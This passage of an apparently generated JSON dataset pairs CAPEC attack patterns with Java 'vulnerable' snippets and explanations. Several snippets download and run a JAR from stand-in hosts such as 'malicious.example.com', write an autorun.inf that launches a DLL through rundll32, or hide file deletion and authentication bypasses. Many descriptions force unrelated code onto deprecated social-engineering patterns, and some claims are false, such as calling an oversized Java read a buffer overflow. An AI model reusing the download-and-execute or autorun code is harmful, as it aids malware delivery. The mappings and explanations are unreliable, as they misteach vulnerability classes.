        "description": "This Java code snippet demonstrates a vulnerability related to 'Target Influence via Eye Cues' and associated CWEs. The program prompts the user to enter a password and simulates a delay if the password is correct. This delay can be observed by an unauthorized actor, revealing security-relevant information about the internal state of the application (CWE-203: Observable Discrepancy). The delay acts as a non-verbal cue that can be exploited to infer whether the entered password is correct or not. This example highlights how observable behavioral discrepancies can leak sensitive information, aligning with the CAPEC description."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n    private static final String SECRET_KEY = \"SuperSecretKey123\";\n\n    public static void main(String[] args) {\n        // Simulate speculative execution vulnerability\n        int[] array = new int[10];\n        int index = 20; // Out of bounds index\n        try {\n            // Speculative execution might access this out-of-bounds index\n            int value = array[index];\n            logger.info(\"Accessed value: \" + value);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            logger.warning(\"Attempted to access out-of-bounds index\");\n        }\n\n        // Log sensitive information (CWE-532)\n        logger.info(\"Secret Key: \" + SECRET_KEY);\n    }\n}",
        "description": "This Java code snippet demonstrates a speculative execution vulnerability and excessive logging of sensitive information. The code attempts to access an out-of-bounds index in an array, which could lead to speculative execution issues (CWE-1342, CWE-1420). Additionally, it logs sensitive information (SECRET_KEY) to the console, representing an information exposure vulnerability (CWE-532). This snippet embodies the deprecated CAPEC concept of 'Target Influence via Micro-Expressions' by showing how transient execution and excessive logging can expose sensitive data."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        \n        // CWE-1286: Improper Validation of Syntactic Correctness of Input\n        if (userInput == null || userInput.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid input\");\n            return;\n        }\n        \n        // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n        try {\n            // Simulate processing that could fail\n            if (userInput.contains(\"<script>\")) {\n                throw new Exception(\"Processing error\");\n            }\n        } catch (Exception e) {\n            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, \"Error: \" + e.getMessage());\n            return;\n        }\n        \n        // CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n        String template = \"<html><body>Welcome, ${userInput}</body></html>\";\n        String output = template.replace(\"${userInput}\", userInput);\n        response.getWriter().write(output);\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the deprecated CAPEC pattern 'Target Influence via Neuro-Linguistic Programming (NLP)' and associated CWEs. The servlet processes user input without proper validation and neutralization, leading to multiple security issues:\n\n1. **CWE-1286: Improper Validation of Syntactic Correctness of Input** - The code checks if the input is null or empty but does not validate its syntactic correctness.\n2. **CWE-81: Improper Neutralization of Script in an Error Message Web Page** - If an error occurs during processing, the error message includes the user input without neutralizing potential script tags, leading to cross-site scripting (XSS) vulnerabilities.\n3. **CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine** - The code uses a simple template engine to insert user input into an HTML template without neutralizing special characters, which can lead to template injection attacks.\n\nThe code snippet represents the main idea of the deprecated CAPEC pattern by showing how improper handling of user input can lead to various security vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableNLP {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your command:\");\n        String userInput = scanner.nextLine();\n\n        // Simulate processing the input in an NLP system\n        processInput(userInput);\n    }\n\n    private static void processInput(String input) {\n        // CWE-1286: Improper Validation of Syntactic Correctness of Input\n        if (!input.matches(\"^[a-zA-Z0-9 ]*$\")) {\n            System.out.println(\"Invalid input detected!\");\n            return;\n        }\n\n        // CWE-149: Improper Neutralization of Quoting Syntax\n        if (input.contains(\"\\\"\") || input.contains(\"'\") || input.contains(\"`\")) {\n            System.out.println(\"Input contains dangerous characters!\");\n            return;\n        }\n\n        // Simulate a vulnerable action based on the input\n        System.out.println(\"Processing: \" + input);\n    }\n}",
        "description": "This Java code snippet represents a simplified Natural Language Processing (NLP) system that takes user input and processes it. The code demonstrates vulnerabilities related to improper validation and neutralization of input, which are common issues in NLP systems. Specifically, it checks for syntactic correctness (CWE-1286) and improper neutralization of quoting syntax (CWE-149). The code does not handle these checks robustly, making it susceptible to attacks where an attacker could inject malicious input to influence the system's behavior. This embodies the main idea of the deprecated CAPEC 'Target Influence via Voice in NLP'."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class HumanBufferOverflowExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 8080);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"password123\";\n            out.println(sensitiveData); // Transmitting sensitive data in cleartext\n\n            // CWE-120: Buffer Copy without Checking Size of Input\n            char[] buffer = new char[1024];\n            int bytesRead = in.read(buffer, 0, 2048); // Potential buffer overflow\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission\n            String receivedMessage = new String(buffer, 0, bytesRead);\n            System.out.println(\"Received: \" + receivedMessage); // No integrity check\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple client-server communication scenario that embodies the concept of 'Target Influence via The Human Buffer Overflow' by embedding messages within communication patterns. The code includes several vulnerabilities related to the described CAPEC and CWEs:\n\n1. **CWE-319: Cleartext Transmission of Sensitive Information** - The code transmits sensitive data (a password) in cleartext, which can be intercepted by unauthorized actors.\n2. **CWE-120: Buffer Copy without Checking Size of Input** - The code reads data into a buffer without verifying the size, leading to a potential buffer overflow.\n3. **CWE-924: Improper Enforcement of Message Integrity During Transmission** - The code does not ensure the integrity of the received message, making it susceptible to tampering during transmission.\n\nThe main idea of the CAPEC is represented by the potential for an attacker to embed malicious commands or data within normal communication, exploiting the vulnerabilities to influence the target's behavior or system state."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class SensitiveDataExposure {\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/mydatabase\";\n    private static final String USER = \"user\";\n    private static final String PASS = \"password\";\n\n    public static void main(String[] args) {\n        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS)) {\n            String query = \"SELECT COUNT(*) FROM users WHERE age > ?\";\n            PreparedStatement pstmt = conn.prepareStatement(query);\n            pstmt.setInt(1, 30);\n            ResultSet rs = pstmt.executeQuery();\n\n            if (rs.next()) {\n                int count = rs.getInt(1);\n                System.out.println(\"Number of users older than 30: \" + count);\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to the CAPEC 'Target Influence via Interview and Interrogation' and the associated CWEs. The code connects to a database and executes a query to count the number of users older than 30. This seemingly harmless query can expose sensitive information through data queries (CWE-202) by allowing an attacker to infer the age distribution of users. Additionally, the code does not correlate multiple data sources (CWE-1293), making it easier for an attacker to manipulate the data source without detection. The code also lacks proper security policies (CWE-213), potentially exposing sensitive information to unauthorized actors. This example highlights how statistical queries can be used to infer confidential information, aligning with the main idea of the CAPEC."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            // Establishing a communication channel without verifying the endpoint\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Sending data without verifying the destination\n            out.println(\"Sensitive Data\");\n\n            // Receiving data without verifying the source\n            String response = in.readLine();\n            System.out.println(\"Response: \" + response);\n\n            // Observable behavioral discrepancy\n            if (response.equals(\"Expected Response\")) {\n                System.out.println(\"Behavior A\");\n            } else {\n                System.out.println(\"Behavior B\");\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel that embodies the main idea of 'Target Influence via Instant Rapport' and related CWEs. The code establishes a socket connection to 'example.com' on port 8080 without verifying the identity of the endpoint (CWE-300). It sends sensitive data without ensuring the destination is correct (CWE-941) and receives data without verifying the source (CWE-940). Additionally, the code exhibits observable behavioral discrepancies based on the response received (CWE-205). This setup allows an attacker to influence the communication channel and potentially manipulate the behavior of the application."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "public class VulnerableDevice {\n    private static final String CONFIG_FILE = \"/path/to/config/pre_production_config.xml\";\n    private static final String SECRET_KEY = \"hardcoded_secret_key\";\n\n    public static void main(String[] args) {\n        // Load configuration\n        loadConfiguration(CONFIG_FILE);\n\n        // Use a non-updateable component\n        NonUpdateableComponent component = new NonUpdateableComponent();\n        component.performOperation();\n\n        // Store confidential information in an unprotected manner\n        storeConfidentialInfo(SECRET_KEY);\n    }\n\n    private static void loadConfiguration(String configFile) {\n        // Simulate loading a pre-production configuration\n        System.out.println(\"Loading configuration from: \" + configFile);\n    }\n\n    private static void storeConfidentialInfo(String secretKey) {\n        // Simulate storing confidential information\n        System.out.println(\"Storing confidential information with key: \" + secretKey);\n    }\n}\n\nclass NonUpdateableComponent {\n    public void performOperation() {\n        // Simulate an operation that cannot be updated\n        System.out.println(\"Performing operation with non-updateable component.\");\n    }\n}",
        "description": "This Java code snippet represents a vulnerable device that embodies the main idea of the CAPEC 'Modification During Manufacture'. The code includes several weaknesses related to the CWEs mentioned: \n1. The device loads a pre-production configuration file (CWE-1269: Product Released in Non-Release Configuration).\n2. It uses a hardcoded secret key to store confidential information, which could be accessed by OSAT vendors (CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors).\n3. It relies on a non-updateable component, making it impossible to patch vulnerabilities (CWE-1329: Reliance on Component That is Not Updateable).\n\nThese elements illustrate how an attacker could exploit these weaknesses during the manufacturing process to compromise the device's security."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class VulnerableDistribution {\n    public static void main(String[] args) {\n        // CWE-1269: Product Released in Non-Release Configuration\n        Properties config = new Properties();\n        try (InputStream input = new FileInputStream(\"config.properties\")) {\n            config.load(input);\n            String mode = config.getProperty(\"mode\");\n            if (\"development\".equals(mode)) {\n                System.out.println(\"Warning: Running in development mode!\");\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        try (BufferedReader br = new BufferedReader(new FileReader(\"sensitive_data.txt\"))) {\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line); // Potentially exposing sensitive information\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        try {\n            // Simulating the use of a third-party library\n            ThirdPartyLibrary lib = new ThirdPartyLibrary();\n            lib.performAction();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ThirdPartyLibrary {\n    public void performAction() throws Exception {\n        // Simulate a vulnerability\n        throw new Exception(\"Vulnerable third-party component\");\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Manipulation During Distribution'. The code includes: \n1. **CWE-1269**: The application reads a configuration file and warns if it is running in 'development' mode, indicating a non-release configuration. \n2. **CWE-200**: The application reads and prints sensitive information from a file, potentially exposing it to unauthorized actors. \n3. **CWE-1395 and CWE-1357**: The application uses a third-party library that throws an exception, simulating a dependency on a vulnerable and insufficiently trustworthy component. \nThese vulnerabilities highlight the risks of tampering and manipulation during the distribution of software products."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "public class HardwareIntegrityAttack {\n    private static final int MAX_VOLTAGE = 5;\n    private static final int MIN_VOLTAGE = 0;\n    private static final int MAX_CLOCK_SPEED = 3000; // in MHz\n    private static final int MIN_CLOCK_SPEED = 1000; // in MHz\n\n    public static void main(String[] args) {\n        // Simulate voltage glitch attack\n        int voltage = 6; // Exceeds MAX_VOLTAGE\n        if (voltage > MAX_VOLTAGE || voltage < MIN_VOLTAGE) {\n            System.out.println(\"Voltage glitch detected! System may be compromised.\");\n        }\n\n        // Simulate clock glitch attack\n        int clockSpeed = 3500; // Exceeds MAX_CLOCK_SPEED\n        if (clockSpeed > MAX_CLOCK_SPEED || clockSpeed < MIN_CLOCK_SPEED) {\n            System.out.println(\"Clock glitch detected! System may be compromised.\");\n        }\n\n        // Simulate error injection in redundant block\n        boolean isRedundantBlockCompromised = true;\n        if (isRedundantBlockCompromised) {\n            System.out.println(\"Error injected into redundant block! System redundancy degraded.\");\n        }\n\n        // Simulate reliance on non-updateable component\n        boolean isComponentUpdateable = false;\n        if (!isComponentUpdateable) {\n            System.out.println(\"Component is not updateable! Vulnerabilities cannot be patched.\");\n        }\n\n        // Simulate security version rollback\n        int currentVersion = 2;\n        int rollbackVersion = 1;\n        if (rollbackVersion < currentVersion) {\n            System.out.println(\"Security version rollback detected! System may be running vulnerable firmware.\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates various hardware integrity attacks as described in the CAPEC and related CWEs. It includes checks for voltage and clock glitches, error injection in redundant blocks, reliance on non-updateable components, and security version rollback. The code demonstrates how an adversary might exploit these weaknesses to compromise the system's integrity, degrade its redundancy, and expose it to vulnerabilities."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "public class MaliciousLogic {\n    public static void main(String[] args) {\n        // Simulate benign functionality\n        System.out.println(\"Welcome to the digital photo frame!\");\n        // Hidden malicious logic\n        if (isInfected()) {\n            replicateMalware();\n        }\n    }\n\n    private static boolean isInfected() {\n        // Check for infection (simulated)\n        return true; // Always returns true for demonstration purposes\n    }\n\n    private static void replicateMalware() {\n        // Simulate malware replication\n        System.out.println(\"Replicating malware to other connected devices...\");\n        // In a real scenario, this would attempt to spread the malware\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Malicious Logic Insertion' (CAPEC) by embedding hidden malicious logic within a seemingly benign application, in this case, a digital photo frame. The main method simulates the benign functionality by printing a welcome message. However, it also contains hidden malicious logic that checks if the system is infected and, if so, replicates the malware to other connected devices. This demonstrates CWE-506 (Embedded Malicious Code) and CWE-509 (Replicating Malicious Code). The code is a simplified example to illustrate how malicious logic can be inserted into a benign system to achieve negative impacts."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "public class InfectedSoftware {\n    public static void main(String[] args) {\n        System.out.println(\"Running benign functionality...\");\n        // Benign functionality\n        benignFunction();\n        // Malicious code hidden in the software\n        maliciousFunction();\n    }\n\n    private static void benignFunction() {\n        System.out.println(\"This is a benign function.\");\n    }\n\n    private static void maliciousFunction() {\n        // Hidden malicious logic\n        System.out.println(\"Executing hidden malicious code...\");\n        // Example of malicious action: deleting a file\n        try {\n            java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get(\"/path/to/important/file.txt\"));\n        } catch (java.io.IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The main method runs a benign function that prints a message, simulating normal software behavior. However, it also calls a hidden malicious function that performs a harmful action, such as deleting an important file. This hidden malicious logic represents the CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) weaknesses. The code is designed to show how malicious logic can be embedded within otherwise benign software, executing harmful actions without the user's knowledge."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Load and execute the downloaded code\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an authorized developer injects malicious logic into a product. The code downloads an update from a remote location without performing any integrity checks (CWE-494). This downloaded code could contain embedded malicious code (CWE-506). The downloaded file is then executed, potentially creating new resources or permissions that could be exploited (CWE-1229, CWE-277). This represents the CAPEC of 'Malicious Logic Inserted Into Product by Authorized Developer' by showing how an insider could introduce vulnerabilities into a product."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "public class SecureApp {\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        // Simulate authentication\n        authenticateUser();\n\n        // Critical operation that should only be performed if authenticated\n        if (isAuthenticated) {\n            performCriticalOperation();\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    private static void authenticateUser() {\n        // Malicious code inserted during development\n        // This code bypasses the actual authentication mechanism\n        isAuthenticated = true;\n    }\n\n    private static void performCriticalOperation() {\n        System.out.println(\"Performing critical operation...\");\n        // Sensitive system information exposure\n        System.out.println(\"Sensitive Data: [REDACTED]\");\n    }\n}",
        "description": "This Java code snippet represents a scenario where an adversary has inserted malicious code during the development phase, embodying the concept of 'Development Alteration' (CAPEC-0033). The 'authenticateUser' method is supposed to handle user authentication, but it has been maliciously altered to always set 'isAuthenticated' to true, bypassing the actual authentication process. This allows unauthorized access to the 'performCriticalOperation' method, which exposes sensitive system information. This example also touches on related CWEs such as 'Embedded Malicious Code' (CWE-506) and 'Exposure of Sensitive System Information to an Unauthorized Control Sphere' (CWE-497)."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious-server.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, bytesRead, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            Process p = pb.start();\n            p.waitFor();\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where malicious logic is inserted into a software product via configuration management manipulation. The code downloads an update from a remote server without performing any integrity checks (CWE-494). It then executes the downloaded code, which is from an untrusted source (CWE-829). This represents the main idea of the CAPEC, where an adversary can manipulate the configuration management system to insert malicious logic into a software product."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import java.util.*;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        // Including a third-party component from an untrusted source\n        ThirdPartyComponent component = new ThirdPartyComponent();\n        component.execute();\n    }\n}\n\n// Simulating a third-party component\nclass ThirdPartyComponent {\n    public void execute() {\n        // Malicious logic embedded within the third-party component\n        System.out.println(\"Executing malicious code...\");\n        // Potentially harmful operations\n        deleteSystemFiles();\n    }\n\n    private void deleteSystemFiles() {\n        System.out.println(\"Deleting system files...\");\n        // Code to delete critical system files\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that includes a third-party component from an untrusted source. The `VulnerableApp` class imports and executes a `ThirdPartyComponent`, which contains malicious logic. The `ThirdPartyComponent` class simulates harmful behavior by printing messages and calling a method that represents the deletion of system files. This example embodies the CAPEC of 'Malicious Logic Insertion into Product via Inclusion of Third-Party Component' and highlights related CWEs such as dependency on a vulnerable third-party component (CWE-1395), inclusion of functionality from an untrusted control sphere (CWE-829), and embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "public class SecureSystem {\n    private boolean isAuthenticated = false;\n    private String sensitiveData = \"Sensitive Information\";\n\n    // Design alteration: intentionally flawed authentication mechanism\n    public void authenticate(String password) {\n        // CWE-657: Violation of Secure Design Principles\n        if (password.equals(\"password123\")) {\n            isAuthenticated = true;\n        }\n    }\n\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    public String getSensitiveData() {\n        if (isAuthenticated) {\n            return sensitiveData;\n        } else {\n            return \"Access Denied\";\n        }\n    }\n\n    public static void main(String[] args) {\n        SecureSystem system = new SecureSystem();\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(system.getSensitiveData()); // Should be protected but is not\n    }\n}",
        "description": "This Java code snippet represents a system where the design has been intentionally altered to introduce vulnerabilities. The `authenticate` method uses a weak password check (CWE-657), violating secure design principles. The `getSensitiveData` method relies on client-side enforcement of security (CWE-602), which is inherently insecure. The `main` method demonstrates how sensitive information can be exposed to unauthorized users (CWE-497). This code embodies the concept of a design alteration attack, where the system's design is modified to introduce vulnerabilities that can be exploited later."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class MaliciousDLL {\n    public static void main(String[] args) {\n        try {\n            // CWE-426: Untrusted Search Path\n            String dllPath = args[0];\n            Path path = Paths.get(dllPath);\n            byte[] dllBytes = Files.readAllBytes(path);\n\n            // CWE-506: Embedded Malicious Code\n            // Insert malicious code into the DLL\n            byte[] maliciousCode = \"malicious code\".getBytes();\n            System.arraycopy(maliciousCode, 0, dllBytes, 100, maliciousCode.length);\n\n            // CWE-509: Replicating Malicious Code\n            // Write the modified DLL back to the file system\n            Files.write(path, dllBytes);\n\n            // CWE-497: Exposure of Sensitive System Information\n            // Log sensitive information\n            System.out.println(\"Sensitive Information: \" + System.getProperty(\"os.name\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code reads a DLL file from an untrusted search path (CWE-426), inserts malicious code into it (CWE-506), and writes the modified DLL back to the file system (CWE-509). Additionally, it logs sensitive system information (CWE-497). This snippet represents how an adversary might tamper with a DLL to embed a virus, potentially leading to the infection of other systems and exposure of sensitive information."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) {\n        String usbPath = \"E:\\\\malicious.exe\"; // Path to the malicious executable on the USB stick\n        try {\n            File usbFile = new File(usbPath);\n            if (usbFile.exists()) {\n                // Simulate execution of malicious code\n                executeMaliciousCode(usbFile);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void executeMaliciousCode(File file) throws IOException {\n        // CWE-506: Embedded Malicious Code\n        FileInputStream fis = new FileInputStream(file);\n        byte[] data = new byte[(int) file.length()];\n        fis.read(data);\n        fis.close();\n        // Simulate malicious activity\n        System.out.println(\"Executing malicious code...\");\n        // CWE-507: Trojan Horse\n        // Hidden malicious functionality\n        if (data.length > 0) {\n            System.out.println(\"Malicious code executed.\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates the propagation of malware via a USB stick, embodying the deprecated CAPEC pattern. The code checks for the existence of a file on a USB drive and simulates the execution of malicious code if the file is found. The `executeMaliciousCode` method reads the file's content and prints a message indicating the execution of malicious code, representing CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse). This demonstrates how a seemingly benign file on a USB stick can contain hidden malicious functionality that violates the intended security policy."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) {\n        String usbPath = \"E:\\\\autorun.inf\";\n        String maliciousDllPath = \"E:\\\\malicious.dll\";\n        createAutorunFile(usbPath, maliciousDllPath);\n    }\n\n    private static void createAutorunFile(String autorunPath, String dllPath) {\n        try {\n            File autorunFile = new File(autorunPath);\n            if (!autorunFile.exists()) {\n                autorunFile.createNewFile();\n            }\n            FileWriter writer = new FileWriter(autorunFile);\n            writer.write(\"[autorun]\\n\");\n            writer.write(\"open=rundll32.exe \" + dllPath + \",DllMain\\n\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation of an 'autorun.inf' file on a USB drive, which is a common method for propagating malware via USB devices. The 'autorun.inf' file is configured to execute a malicious DLL file ('malicious.dll') using 'rundll32.exe' when the USB drive is accessed. This embodies the main idea of the deprecated CAPEC-448, which involves embedding a virus into a DLL and using autorun functionality to propagate malware. The code also touches on related CWEs such as CWE-426 (Untrusted Search Path) by specifying an external path for the DLL, and CWE-509 (Replicating Malicious Code) by setting up the conditions for the malware to spread."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MalwarePropagation {\n    public static void main(String[] args) {\n        try {\n            // Simulate copying a file from an infected peripheral device\n            File sourceFile = new File(\"/media/usb/infectedFile.exe\");\n            File destFile = new File(\"/home/user/infectedFile.exe\");\n            copyFile(sourceFile, destFile);\n\n            // Simulate executing the copied file\n            Runtime.getRuntime().exec(destFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void copyFile(File source, File dest) throws IOException {\n        try (FileInputStream fis = new FileInputStream(source);\n             FileOutputStream fos = new FileOutputStream(dest)) {\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = fis.read(buffer)) > 0) {\n                fos.write(buffer, 0, length);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the propagation of malware via an infected peripheral device, aligning with the deprecated CAPEC pattern. The code simulates copying a malicious file from a USB device to a user's home directory and then executing it. This represents a typical malware propagation scenario. The code also touches on CWE-507 (Trojan Horse) as the copied file appears benign but contains malicious code. Additionally, it indirectly relates to CWE-589 (Call to Non-ubiquitous API) as the `Runtime.getRuntime().exec` method may not behave consistently across different environments, potentially leading to security issues."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "public class InfectedHardware {\n    private static boolean debugMode = false;\n    private static int[] memoryMappedRegisters = new int[10];\n\n    public static void main(String[] args) {\n        // Simulate normal operation\n        performNormalOperation();\n\n        // Malicious logic hidden from the user\n        if (debugMode) {\n            activateMaliciousLogic();\n        }\n    }\n\n    private static void performNormalOperation() {\n        // Normal hardware operation code\n        System.out.println(\"Performing normal operation...\");\n    }\n\n    private static void activateMaliciousLogic() {\n        // Malicious code that alters hardware behavior\n        System.out.println(\"Activating malicious logic...\");\n        for (int i = 0; i < memoryMappedRegisters.length; i++) {\n            memoryMappedRegisters[i] = 0xDEADBEEF; // Overwrite registers with malicious data\n        }\n    }\n\n    // Simulate improper access control to register interface\n    public static void writeToRegister(int index, int value) {\n        if (index >= 0 && index < memoryMappedRegisters.length) {\n            memoryMappedRegisters[index] = value;\n        }\n    }\n\n    // Simulate activation of debug mode at runtime\n    public static void enableDebugMode() {\n        debugMode = true;\n    }\n}",
        "description": "This Java code snippet simulates a scenario where malicious logic is inserted into hardware. The `main` method represents the normal operation of the hardware. However, if `debugMode` is enabled, the `activateMaliciousLogic` method is called, which overwrites memory-mapped registers with malicious data. This represents CWE-506 (Embedded Malicious Code) and CWE-509 (Replicating Malicious Code). The `writeToRegister` method simulates improper access control to the register interface (CWE-1262), and the `enableDebugMode` method allows for the activation of debug logic at runtime (CWE-1313). The code demonstrates how an adversary could insert and activate malicious logic in hardware, aligning with the CAPEC description of 'Infected Hardware'."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
